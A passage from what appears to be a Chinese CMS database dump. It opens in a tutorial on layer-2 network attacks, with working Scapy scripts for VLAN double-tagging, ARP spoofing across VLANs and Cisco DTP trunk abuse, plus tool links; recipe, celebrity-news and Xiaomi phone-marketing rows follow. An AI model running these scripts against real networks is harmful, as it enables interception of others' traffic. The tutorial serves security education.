<code>Ether(dst</code><code>=</code><code>&quot;c0:d3:de:ad:be:ef&quot;</code><code>) </code><code>/</code> <code>\\</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>Dot1Q(vlan</code><code>=</code><code>1</code><code>) </code><code>/</code> <code>\\</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>Dot1Q(vlan</code><code>=</code><code>2</code><code>) </code><code>/</code> <code>\\</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>IP(dst</code><code>=</code><code>&quot;192.168.13.3&quot;</code><code>) </code><code>/</code> <code>\\</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>ICMP()&nbsp;&nbsp;&nbsp; </code></p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p><code>sendp(packet)</code></p>\r\n			</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>首先我们设定在数据包的头部当中，包含我们的<code>VLAN</code>标记，再加上一个目的主机地址。交换机将会移除第一个标记，并不决定如何处理该数据包，当它看到第二个标记<code>VLAN id 2</code> 的时候，则决定转发到这个<code>vlan</code>。如果交换机连接到其他通过堆叠启用的<code>VLAN</code>交换机，这种攻击只会是成功的，否则它们就是使用的基于端口的<code>VLAN</code>。</p>\r\n\r\n<h1>0x06 Let&rsquo;s Play Switch</h1>\r\n\r\n<hr />\r\n<p><code>Linux</code>可以运行在许多嵌入式网络设备上；因此凭借<code>Linux</code>操作系统，人们可以把自己的电脑变成一台功能齐全的<code>VALN</code>交换机，这并不令人惊奇。你只需要<code>vconfig</code>这种工具就够了。在根据你的操作系统安装所需的数据包后，通过以下的命令，你可以将你的主机加入到另一个<code>VLAN</code>环境中。</p>\r\n\r\n<pre>\r\nvconfig add eth0 1\r\n</pre>\r\n\r\n<p>然后你必须记住启动新设备，并给它一个<code>VLAN</code>网络中的<code>IP</code>地址。</p>\r\n\r\n<pre>\r\nifconfig eth0.1 192.168.13.23 up\r\n</pre>\r\n\r\n<h1>0x07 ARP Spoofing Over VLAN Hopping</h1>\r\n\r\n<hr />\r\n<p><code>VLAN</code>会限制对同一<code>VLAN</code>的端口的广播流量，因此我们不能在默认情况下应对所有的<code>ARP</code>请求，就像在第一个<code>ARP spoofing</code>例子中看到的那样，必须每隔几秒就向受害者告诉我们的<code>MAC</code>地址。除了我们对每个数据包进行了标记和加之的目的<code>VLAN</code>，下面的代码是通用的。</p>\r\n\r\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\">\r\n	<tbody>\r\n		<tr>\r\n			<td>\r\n			<p>1</p>\r\n\r\n			<p>2</p>\r\n\r\n			<p>3</p>\r\n\r\n			<p>4</p>\r\n\r\n			<p>5</p>\r\n\r\n			<p>6</p>\r\n\r\n			<p>7</p>\r\n\r\n			<p>8</p>\r\n\r\n			<p>9</p>\r\n\r\n			<p>10</p>\r\n\r\n			<p>11</p>\r\n\r\n			<p>12</p>\r\n\r\n			<p>13</p>\r\n\r\n			<p>14</p>\r\n\r\n			<p>15</p>\r\n\r\n			<p>16</p>\r\n\r\n			<p>17</p>\r\n\r\n			<p>18</p>\r\n\r\n			<p>19</p>\r\n\r\n			<p>20</p>\r\n\r\n			<p>21</p>\r\n\r\n			<p>22</p>\r\n\r\n			<p>23</p>\r\n			</td>\r\n			<td>\r\n			<p><code>#!/usr/bin/python&nbsp;&nbsp;&nbsp; </code></p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p><code>import</code> <code>time</code></p>\r\n\r\n			<p><code>from</code> <code>scapy.</code><code>all</code> <code>import</code> <code>sendp, ARP, Ether, Dot1Q&nbsp;&nbsp;&nbsp; </code></p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p><code>iface </code><code>=</code> <code>&quot;eth0&quot;</code></p>\r\n\r\n			<p><code>target_ip </code><code>=</code> <code>&#39;192.168.13.23&#39;</code></p>\r\n\r\n			<p><code>fake_ip </code><code>=</code> <code>&#39;192.168.13.5&#39;</code></p>\r\n\r\n			<p><code>fake_mac </code><code>=</code> <code>&#39;c0:d3:de:ad:be:ef&#39;</code></p>\r\n\r\n			<p><code>our_vlan </code><code>=</code> <code>1</code></p>\r\n\r\n			<p><code>target_vlan </code><code>=</code> <code>2</code>&nbsp;&nbsp;&nbsp;</p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p><code>packet </code><code>=</code> <code>Ether() </code><code>/</code> <code>\\</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>Dot1Q(vlan</code><code>=</code><code>our_vlan) </code><code>/</code> <code>\\</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>Dot1Q(vlan</code><code>=</code><code>target_vlan) </code><code>/</code> <code>\\</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>ARP(hwsrc</code><code>=</code><code>fake_mac,</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>pdst</code><code>=</code><code>target_ip,</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>psrc</code><code>=</code><code>fake_ip,</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>op</code><code>=</code><code>&quot;is-at&quot;</code><code>)&nbsp;&nbsp;&nbsp; </code></p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p><code>while</code> <code>True</code><code>:</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>sendp(packet, iface</code><code>=</code><code>iface)</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>time.sleep(</code><code>10</code><code>)</code></p>\r\n			</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>幸运的是，防御这种类型的<code>VLAN</code>攻击并没有那么复杂：如果你真的想分离你的网络，只需要使用物理划分的交换机！</p>\r\n\r\n<h1>0x08 DTP Abusing</h1>\r\n\r\n<hr />\r\n<p><code>DTP</code>（动态中继协议）是一种由思科发明的专有协议，用于如果一个端口是<code>trunk</code>端口，则交换机之间可以动态地交流。<code>Trunk</code>端口通常用于互连交换机和路由器，以便共享一些或所有已知的<code>VLAN</code>。</p>\r\n\r\n<p>为了能够执行下面的代码，你需要安装<code>Scapy</code>的开发版本。同时为了<code>check out</code>出源，请先安装<code>Mercurial</code>，然后键入以下命令来克隆<code>Scapy repository</code>。</p>\r\n\r\n<pre>\r\nhg clone http://hg.secdev.org/scapy scapy\r\n</pre>\r\n\r\n<p>如果你想跟踪<code>Scapy</code>的最新版本，你只需要时不时地更新<code>checkout</code>。</p>\r\n\r\n<pre>\r\ncd scapy\r\nhg pull\r\n</pre>\r\n\r\n<p>现在你可以将旧版本的<code>Scapy</code>变成最新版的了。</p>\r\n\r\n<pre>\r\npip uninstall Scapy\r\ncd scapy\r\npython setup.py install\r\n</pre>\r\n\r\n<p>多亏了<code>DTP</code>协议，和它完全忽视任何一种安全的属性，我们现在就可以发送一个动态可取包到每一个启用DTP的思科设备，并要求它将我们的端口转变为<code>trunk</code>端口。</p>\r\n\r\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\">\r\n	<tbody>\r\n		<tr>\r\n			<td>\r\n			<p>1</p>\r\n\r\n			<p>2</p>\r\n\r\n			<p>3</p>\r\n\r\n			<p>4</p>\r\n\r\n			<p>5</p>\r\n\r\n			<p>6</p>\r\n\r\n			<p>7</p>\r\n\r\n			<p>8</p>\r\n\r\n			<p>9</p>\r\n\r\n			<p>10</p>\r\n\r\n			<p>11</p>\r\n			</td>\r\n			<td>\r\n			<p><code>#!/usr/bin/python&nbsp;&nbsp;&nbsp; </code></p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p><code>import</code> <code>sys</code></p>\r\n\r\n			<p><code>from</code> <code>scapy.layers.l2 </code><code>import</code> <code>Dot3 , LLC, SNAP</code></p>\r\n\r\n			<p><code>from</code> <code>scapy.contrib.dtp </code><code>import</code> <code>*</code>&nbsp;&nbsp;&nbsp;</p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p><code>if</code> <code>len</code><code>(sys.argv) &lt; </code><code>2</code><code>:</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>print</code> <code>sys.argv[</code><code>0</code><code>] </code><code>+</code> <code>&quot; &lt;dev&gt;&quot;</code></p>\r\n\r\n			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>sys.exit()&nbsp;&nbsp;&nbsp; </code></p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p><code>negotiate_trunk(iface</code><code>=</code><code>sys.argv[</code><code>1</code><code>])</code></p>\r\n			</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>作为一个可选参数，你可以设置欺骗相邻交换机的<code>MAC</code>地址，如果没有设置，则会自动生成一个随机值。</p>\r\n\r\n<p>这种攻击可能会持续几分钟，但是攻击者并不关心延迟，因为他们知道在改变连接到每一个<code>VLAN</code>的可能性之后他们会得到什么！</p>\r\n\r\n<pre>\r\nvconfig add eth0 &lt;vlan-id&gt;\r\nifconfig eth0.&lt;vlan-id&gt; &lt;ip_of_vlan&gt; up\r\n</pre>\r\n\r\n<p>没有足够好的理由来使用<code>DTP</code>，所以干脆禁用掉它吧！</p>\r\n\r\n<h1>0x09 Tools</h1>\r\n\r\n<hr />\r\n<ol>\r\n	<li>\r\n	<p><strong>NetCommander</strong></p>\r\n\r\n	<p><code>NetCommander</code>是一个简单的<code>ARP</code>欺骗程序。它通过对每一个可能的<code>IP</code>发送<code>ARP</code>请求，来搜索网络上存活的主机。你可以选择需要劫持的连接，然后每隔几秒，<code>NetCommander</code>就会自动地欺骗那些主机和默认网关之间的双向连接。</p>\r\n\r\n	<p>工具的源代码可以从这里下载：<a href=\"https://github.com/evilsocket/NetCommander\">https://github.com/evilsocket/NetCommander</a></p>\r\n	</li>\r\n	<li>\r\n	<p><strong>Hacker&rsquo;s Hideaway ARP Attack Tool</strong></p>\r\n\r\n	<p><code>Hacker&rsquo;s Hideaway ARP Attack Tool</code>比<code>NetCommander</code>的功能多一些。除了欺骗特殊连接，它还支持被动欺骗所有对源<code>IP</code>的<code>ARP</code>请求，和<code>MAC</code>泛洪攻击。</p>\r\n\r\n	<p>工具的下载链接为：<a href=\"https://packetstormsecurity.org/files/81368/hharp.py.tar.bz2\">https://packetstormsecurity.org/files/81368/hharp.py.tar.bz2</a></p>\r\n	</li>\r\n	<li>\r\n	<p><strong>Loki</strong></p>\r\n\r\n	<p><code>Loki</code>是一种像<code>Yersinia</code>的第二层和第三层攻击工具。它可以通过插件来扩展，也有一个漂亮的<code>GUI</code>界面。它实现了像<code>ARP</code>欺骗和泛洪，<code>BGP</code>，<code>RIP</code>路由注入之类的攻击，甚至可以攻击像HSRP和VRRP那样非常罕见的协议。</p>\r\n\r\n	<p>工具的源代码地址为：<a href=\"https://www.c0decafe.de/loki.html\">https://www.c0decafe.de/loki.html</a></p>\r\n	</li>\r\n</ol>\r\n\r\n<p>&nbsp;</p>\r\n',1,2779,0,1,0,'','2016-04-10 17:43:54'),(18,'手撕包菜',29,'推荐,加粗,头条,跳转','食','素食','/CMS3.0/uploads/20160410/20160410155637642.jpg','好豆','马佳','大火快炒，爽脆又多汁的手撕包菜','<h2>手撕包菜的做法</h2>\r\n\r\n<p><em>1.</em></p>\r\n\r\n<p>包菜洗净，沥干水分，用手撕成小块；干辣椒切段，蒜切碎</p>\r\n\r\n<p><img alt=\"\" src=\"http://site.meishij.net/rs/21/119/2654771/n2654771_30074.jpg\" /></p>\r\n\r\n<p><em>2.</em></p>\r\n\r\n<p>锅里热油，大火烧至7、8层熟放蒜蓉和干辣椒爆香；随后放包菜，大火快速炒散</p>\r\n\r\n<p><img alt=\"\" src=\"http://site.meishij.net/rs/21/119/2654771/n2654771_52397.jpg\" /></p>\r\n\r\n<p><em>3.</em></p>\r\n\r\n<p>沿着锅边淋入生抽和香醋，烹出香味；关火，出锅前调入适量盐</p>\r\n\r\n<p><img alt=\"\" src=\"http://site.meishij.net/rs/21/119/2654771/n2654771_69356.jpg\" /></p>\r\n\r\n<p><img src=\"http://site.meishij.net/rs/21/119/2654771/n2654771_69347.jpg\" style=\"margin:0 0 0 100px\" /></p>\r\n\r\n<p><img src=\"http://site.meishij.net/rs/21/119/2654771/n2654771_42195.jpg\" style=\"margin:0 0 0 100px\" /></p>\r\n\r\n<h2>烹饪技巧</h2>\r\n\r\n<p>1、包菜一定要控干水分；<br />\r\n2、全程大火快炒。</p>\r\n',1,62,0,4,4,'red','2016-04-10 17:49:10'),(19,'xinwendangceshi',25,'推荐','junshi,aaa','junshi,aaa','/CMS3.0/uploads/20160426/20160426231147505.jpg','本地','admin','马佳荔晨','<p>哈哈哈,马可可</p>\r\n',1,102,100,1,1,'red','2016-04-26 23:12:20'),(20,'laravel框架5分钟实现注册登录模块',32,'推荐','PHP,Larave','PHP,Larave','/CMS3.0/uploads/20160426/20160426231641570.png','laravel','admin','laravel框架5分钟实现注册登录模块','<p>laravel框架5分钟实现注册登录模块</p>\r\n',1,103,100,0,0,'','2016-04-26 23:17:20'),(21,'台湾,加油',21,'推荐','台湾','台湾','/CMS3.0/uploads/20160426/20160426231853376.jpg','本地','admin','test','<p>test</p>\r\n',1,101,100,0,0,'','2016-04-26 23:19:34'),(22,'优酷计划通过增发再融6亿美元',33,'头条','优酷计划通过增发再融6亿美元','优酷计划通过增发再融6亿美元','/CMS3.0/uploads/20160427/20160427212848343.png','admin','admin','优酷计划通过增发再融6亿美元,优酷计划通过增发再融6亿美元优酷计划通过增发再融6亿美元优酷计划通过增发再融6亿美元优酷计划通过增发再融6亿美元,优酷计划通过增发再融6亿美元','<p><a href=\"http://localhost/CMS3.0/#\">优酷计划通过增发再融6亿美元</a></p>\r\n',1,103,100,0,0,'','2016-04-27 21:39:54'),(23,'电子书市场遭遇优质内容缺失之困',33,'头条','电子书市场遭遇优质内容缺失之困','电子书市场遭遇优质内容缺失之困','/CMS3.0/uploads/20160427/20160427213048752.png','admin','admin','电子书市场遭遇优质内容缺失之困','<p><a href=\"http://localhost/CMS3.0/#\">电子书市场遭遇优质内容缺失之困</a></p>\r\n',1,100,100,0,0,'','2016-04-27 21:30:57'),(24,'张雨绮谈渣男劈腿：遇到就一巴掌呼过去',34,'跳转','女性','张雨绮谈渣男劈腿：遇到就一巴掌呼过去','/CMS3.0/uploads/20160430/20160430200123536.jpg','hao123','admin','近来，张雨绮参加某节目，被主持人马东问及爱情观，她并不回避，更严肃称如果遇到渣男劈腿就一巴掌扇过去，女神的豪爽也让全场为其点赞。','<p><a href=\"http://hot.ynet.com/3.1/1604/30/11248018_2.html\" target=\"_top\"><img alt=\"张雨绮\" src=\"http://file.ynet.com/2/1604/29/11247019.jpg\" />张雨绮（1 ／37张）</a></p>\r\n\r\n<p><ins><a href=\"javascript:;\"><img src=\"http://img.alicdn.com/tps/TB1rRQpJXXXXXcvXXXXXXXXXXXX-40-26.png\" style=\"width:20px\" /></a></ins></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>　　近来，张雨绮参加某节目，被主持人马东问及爱情观，她并不回避，更严肃称如果遇到渣男劈腿就一巴掌扇过去，女神的豪爽也让全场为其点赞。</p>\r\n\r\n<p>　　主持人马东提及当今社会存在的一种名为&ldquo;available&rdquo;的爱情观（就是异地恋人对外表示自己是&ldquo;available&rdquo;的），&ldquo;如果伴侣向你建议说咱们表示&ldquo;available&rdquo;，你接受吗？&rdquo;听完马东的问题，女神便毫不迟疑、一脸坚定地表示&ldquo;扇他一个耳光走人&rdquo;，接着张雨绮还一脸不解的询问&ldquo;为什么呢？&rdquo;似乎不理解为什么会有人提出这种要求、为什么会有人答应此种要求，看来女神对感情也似乎有&ldquo;感情洁癖&rdquo;，无法回答女神问题的马东也只好给了自己一巴掌并且认错&ldquo;我错了。&rdquo;女神还接着补充&ldquo;这不就是人间所称的&lsquo;渣&rsquo;吗？&rdquo;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>责任编辑：范逸昕（EK004）</p>\r\n',1,100,100,0,0,'','2016-04-30 20:02:00'),(25,'全国高校校花出炉 网友吐槽：脸盲症又犯了',34,'推荐','女性','全国高校校花出炉 网友吐槽：脸盲症又犯了（图）','/CMS3.0/uploads/20160430/20160430200316151.jpg','hao123','admin','原标题：全国高校校花出炉 网友吐槽脸盲症又犯了','<p>&nbsp;</p>\r\n\r\n<p><a href=\"http://news.ynet.com/3.1/1604/30/11247845_2.html\" target=\"_top\"><img alt=\"湖南大学校花杨雅雯\" src=\"http://file.ynet.com/2/1604/30/11247898.jpg\" /></a></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>　　原标题：全国高校校花出炉 网友吐槽脸盲症又犯了</p>\r\n\r\n<p>　　人间四月校花美，学姐萌妹惹人醉。从清华的奶茶妹妹，到人大校花康逸琨，再到北大校花袁佳怡&hellip;&hellip;校花如此多娇，引无数宅男竞围观呐。最近各大高校又暗流涌动，一场校花评选的&ldquo;无烟战争&rdquo;已然打响。众宅男刷帖评论无数，都说佳人在自家，那到底哪位校花最后能制霸全国校花界？近日，全国30几所大学校花名单新鲜出炉，有网友看后吐槽脸盲症又犯了。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>责任编辑：刘琰（EN004）</p>\r\n',1,102,100,0,0,'','2016-04-30 20:04:27'),(26,'小米手机5',27,'头条','小米','小米','/CMS3.0/uploads/20160430/20160430200553110.png','小米官网','admin','小米5','<h2>小米手机5<br />\r\n十余项黑科技，很轻狠快</h2>\r\n\r\n<p>骁龙820处理器，最大可选 4GB 内存 + 128GB 闪存&nbsp;<br />\r\n4 轴防抖相机，3D陶瓷 / 玻璃机身</p>\r\n\r\n<p>1999&nbsp;元起</p>\r\n\r\n<p><em></em>&nbsp;<a href=\"javascript:void(0);\" onclick=\"_msq.push([\'trackEvent\', \'31c1912407e371e4-35c04376619d561f\', \'javascript:void(0);\', \'pcpid\']);\">外观视频</a>&nbsp;<em></em>&nbsp;<a href=\"javascript:void(0);\" onclick=\"_msq.push([\'trackEvent\', \'31c1912407e371e4-4b8e92cb895b0d1c\', \'javascript:void(0);\', \'pcpid\']);\">4 轴防抖视频</a></p>\r\n\r\n<p><img alt=\"\" src=\"http://c1.mifile.cn/f/i/16/mi5/index/h-12.jpg\" /></p>\r\n\r\n<h2>14 万分，快得有点狠</h2>\r\n\r\n<p>CPU 性能翻倍的骁龙 820 处理器，提速 87% 的 UFS 闪存，快 40% 的 Adreno 530 图形引擎，<br />\r\n快 100% 的双通道 LPDDR4，Antutu 跑分性能测试高达惊人的 14 万分。</p>\r\n\r\n<p><a href=\"http://www.mi.com/mi5/features/\" onclick=\"_msq.push([\'trackEvent\', \'31c1912407e371e4-501fd0a5196c7d29\', \'/mi5/features/\', \'pcpid\']);\" target=\"_blank\">了解性能 &gt;</a></p>\r\n\r\n<ul>\r\n	<li>\r\n	<h2>骁龙820</h2>\r\n\r\n	<p>旗舰处理器</p>\r\n	</li>\r\n	<li>\r\n	<h2>4GB</h2>\r\n\r\n	<p>可选最大内存</p>\r\n	</li>\r\n	<li>\r\n	<h2>128GB</h2>\r\n\r\n	<p>可选最大闪存</p>\r\n	</li>\r\n</ul>\r\n\r\n<p><img alt=\"\" src=\"http://c1.mifile.cn/f/i/16/mi5/index/h-8.jpg\" /></p>\r\n\r\n<h2>129克，手感轻得不真实</h2>\r\n\r\n<p>5.15&quot; 大屏幕，整机仅 129 克。[注]<br />\r\n还有 3D 纤细侧腰，曲面玻璃的温润手感。握在手中的一刻，仿佛轻轻握住整个世界的倒影。</p>\r\n\r\n<p><a href=\"http://www.mi.com/mi5/design/\" onclick=\"_msq.push([\'trackEvent\', \'31c1912407e371e4-f530e27f9e62709a\', \'/mi5/design/\', \'pcpid\']);\" target=\"_blank\">了解设计&gt;</a></p>\r\n\r\n<h2>4 轴防抖相机，感动、激动、不抖动</h2>\r\n\r\n<p>采用源自专业相机的 4 轴光学防抖技术，比一般手机 2 轴防抖效果更佳，<br />\r\n阳光、暗光、运动、单手，都能稳定记录，清晰成像。</p>\r\n\r\n<p><a href=\"http://www.mi.com/mi5/camera/\" onclick=\"_msq.push([\'trackEvent\', \'31c1912407e371e4-1c74ec574967726f\', \'/mi5/camera/\', \'pcpid\']);\" target=\"_blank\">了解相机&gt;</a></p>\r\n\r\n<ul>\r\n	<li>\r\n	<p>蓝宝石<br />\r\n	镜头保护玻璃</p>\r\n	</li>\r\n	<li>\r\n	<p>6P镜片组</p>\r\n	</li>\r\n	<li>\r\n	<p>4轴光学防抖</p>\r\n	</li>\r\n	<li>\r\n	<p>索尼新一代<br />\r\n	16MP感光元件</p>\r\n	</li>\r\n	<li>\r\n	<p>DTI<br />\r\n	深槽隔离技术</p>\r\n	</li>\r\n	<li>\r\n	<p>暗光增强<br />\r\n	夜景防抖</p>\r\n	</li>\r\n</ul>\r\n\r\n<h2>16颗灯省电高亮屏幕<br />\r\n鲜艳通透</h2>\r\n\r\n<p>屏幕深度定制，在仅有 5.15&quot; 屏幕上精密排布 16 颗 LED 灯珠，亮度提升 30%，色彩依旧鲜艳。灯光下看起来更通透，阳光下看得更清晰，这才是好屏幕应有的亮度。</p>\r\n\r\n<p><a href=\"http://www.mi.com/mi5/screen\" onclick=\"_msq.push([\'trackEvent\', \'31c1912407e371e4-64625e24ca1dbf63\', \'/mi5/screen\', \'pcpid\']);\" target=\"_blank\">了解屏幕&gt;</a></p>\r\n\r\n<h2>十余项黑科技</h2>\r\n\r\n<p>配备能刷卡的 NFC 功能，还有全新 Quick Charge 3.0 快充技术、全网通 3.0。<br />\r\n众多黑科技，正在改变着手机体验的一点一滴。</p>\r\n\r\n<p><a href=\"http://www.mi.com/mi5/features/\" onclick=\"_msq.push([\'trackEvent\', \'31c1912407e371e4-12b51e0432b9fc73\', \'/mi5/features/\', \'pcpid\']);\" target=\"_blank\">了解黑科技&gt;</a></p>\r\n\r\n<ul>\r\n	<li>\r\n	<h3>&nbsp;</h3>\r\n\r\n	<p>骁龙820 4GB + 128GB</p>\r\n	</li>\r\n	<li>\r\n	<h3>&nbsp;</h3>\r\n\r\n	<p>UFS 2.0 闪存</p>\r\n	</li>\r\n	<li>\r\n	<h3>&nbsp;</h3>\r\n\r\n	<p>16颗灯 省电高亮屏</p>\r\n	</li>\r\n	<li>\r\n	<h3>&nbsp;</h3>\r\n\r\n	<p>4 轴防抖相机</p>\r\n	</li>\r\n	<li>\r\n	<h3>&nbsp;</h3>\r\n\r\n	<p>DTI 画质增强</p>\r\n	</li>\r\n	<li>&nbsp;</li>\r\n	<li>&nbsp;</li>\r\n	<li>\r\n	<h3>&nbsp;</h3>\r\n\r\n	<p>3D 陶瓷机身</p>\r\n	</li>\r\n	<li>\r\n	<h3>&nbsp;</h3>\r\n\r\n	<p>全功能 NFC</p>\r\n	</li>\r\n	<li>\r\n	<h3>&nbsp;</h3>\r\n\r\n	<p>快充 3.0</p>\r\n	</li>\r\n	<li>\r\n	<h3>&nbsp;</h3>\r\n\r\n	<p>4G+ 网络</p>\r\n	</li>\r\n	<li>\r\n	<h3>&nbsp;</h3>\r\n\r\n	<p>全网通3.0</p>\r\n	</li>\r\n</ul>\r\n\r\n<h2>MIUI 7 再升级，1.7亿 用户的新惊喜</h2>\r\n\r\n<p>好看、好用的 MIUI 系统，在小米5 上有了新惊喜。离线一键换机、<br />\r\n手机远程锁定防丢失，还有美颜视频电话等有趣的新玩法。</p>\r\n\r\n<p><em></em>&nbsp;<a href=\"javascript:void(0);\" onclick=\"_msq.push([\'trackEvent\', \'31c1912407e371e4-23872a5739cafeba\', \'javascript:void(0);\', \'pcpid\']);\">一键换机演示</a>&nbsp;<a href=\"http://www.mi.com/mi5/features#miui\" onclick=\"_msq.push([\'trackEvent\', \'31c1912407e371e4-78f7fdfb04a6744c\', \'/mi5/features#miui\', \'pcpid\']);\" target=\"_blank\">了解操作系统&gt;</a></p>\r\n\r\n<p><img alt=\"\" src=\"http://c1.mifile.cn/f/i/16/mi5/index/h-21.jpg\" /></p>\r\n\r\n<h2>探索黑科技，小米为发烧而生</h2>\r\n\r\n<p>我们热爱这个时代，正因昨日的探索，今天便成为你手中的科技。<br />\r\n小米5 就是黑科技的代表作之一，配备高通年度旗舰处理器，探索更快内存、新一代闪存、下一<br />\r\n代网络，还有相机、显示技术的重大提升，更不用说凝聚众多科技却仅有 129g 的超轻手感了。<br />\r\n探索更快、探索更清晰、探索更明亮、探索更好握感，<br />\r\n如果你爱这个时代的日新月异，你一定也会爱上与你一起探索的全新小米5。</p>\r\n\r\n<p><em></em>&nbsp;<a href=\"javascript:void(0);\" onclick=\"_msq.push([\'trackEvent\', \'31c1912407e371e4-99c88780ee5f734f\', \'javascript:void(0);\', \'pcpid\']);\">《去探索》小米年度品牌视频</a></p>\r\n\r\n<h2>哪一款是你的最爱？</h2>\r\n\r\n<h3>&nbsp;</h3>\r\n\r\n<ul>\r\n	<li>\r\n	<h2>标准版&nbsp;|&nbsp;1999元</h2>\r\n\r\n	<p>骁龙820 最高主频 1.8GHz<br />\r\n	3GB LPDDR4 + 32GB UFS 闪存、3D曲面玻璃机身</p>\r\n	</li>\r\n	<li>\r\n	<h2>高配版&nbsp;|&nbsp;2299元</h2>\r\n\r\n	<p>骁龙820 最高主频 2.15GHz<br />\r\n	3GB LPDDR4 + 64GB UFS 闪存、3D曲面玻璃机身</p>\r\n	</li>\r\n	<li>\r\n	<p>&gt;</p>\r\n\r\n	<h2>尊享版&nbsp;|&nbsp;2599元起</h2>\r\n\r\n	<p>骁龙820 最高主频 2.15GHz<br />\r\n	4GB LPDDR4 + 128GB UFS 闪存、3D陶瓷 / 玻璃机身</p>\r\n	</li>\r\n</ul>\r\n\r\n<ol>\r\n	<li><a href=\"http://www.mi.com/mi5/#section1\" onclick=\"_msq.push([\'trackEvent\', \'31c1912407e371e4-d741877f1034ab0c\', \'#section1\', \'pcpid\']);\">1综述</a></li>\r\n	<li><a href=\"http://www.mi.com/mi5/#section2\" onclick=\"_msq.push([\'trackEvent\', \'31c1912407e371e4-95ed0e89118a15c6\', \'#section2\', \'pcpid\']);\">2性能</a></li>\r\n	<li><a href=\"http://www.mi.com/mi5/#section3\" onclick=\"_msq.push([\'trackEvent\', \'31c1912407e371e4-6f39670dd0dbcb59\', \'#section3\', \'pcpid\']);\">3设计</a></li>\r\n	<li><a href=\"http://www.mi.com/mi5/#section4\" onclick=\"_msq.push([\'trackEvent\', \'31c1912407e371e4-93c4baafcfb02cb0\', \'#section4\', \'pcpid\']);\">4相机</a></li>\r\n	<li><a href=\"http://www.mi.com/mi5/#section5\" onclick=\"_msq.push([\'trackEvent\', \'31c1912407e371e4-9ba4972abbc1fe11\', \'#section5\', \'pcpid\']);\">5屏幕</a></li>\r\n	<li><a href=\"http://www.mi.com/mi5/#section6\" onclick=\"_msq.push([\'trackEvent\', \'31c1912407e371e4-4ff2e34d4d0aa9c0\', \'#section6\', \'pcpid\']);\">6黑科技</a></li>\r\n	<li><a href=\"http://www.mi.com/mi5/#section7\" onclick=\"_msq.push([\'trackEvent\', \'31c1912407e371e4-a4ab10379a1166f9\', \'#section7\', \'pcpid\']);\">7操作系统</a></li>\r\n	<li><a href=\"http://www.mi.com/mi5/#section8\" onclick=\"_msq.push([\'trackEvent\', \'31c1912407e371e4-b1625849635de29f\', \'#section8\', \'pcpid\']);\">8探索</a></li>\r\n	<li><a href=\"http://www.mi.com/mi5/#section9\" onclick=\"_msq.push([\'trackEvent\', 